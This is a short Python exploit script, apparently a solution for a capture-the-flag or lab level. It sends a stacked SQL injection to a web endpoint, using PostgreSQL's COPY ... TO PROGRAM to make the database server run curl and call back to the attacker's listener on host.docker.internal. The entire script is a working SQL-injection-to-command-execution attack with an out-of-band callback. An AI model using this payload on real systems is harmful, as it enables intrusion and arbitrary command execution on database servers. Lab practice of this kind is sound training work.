import requests

# Run python3 -m http.server 9000 on your machine before executing this script.
# The path /waf will appear in your listener log — that's the next level URL.

LISTENER_PORT = 9000
BASE = 'http://localhost/api/oob'

payload = f"1; COPY (SELECT '') TO PROGRAM 'curl http://host.docker.internal:{LISTENER_PORT}/waf'"
r = requests.get(BASE, params={'id': payload})
print(f"HTTP {r.status_code} — check your listener for the /waf path")
print(r.text)
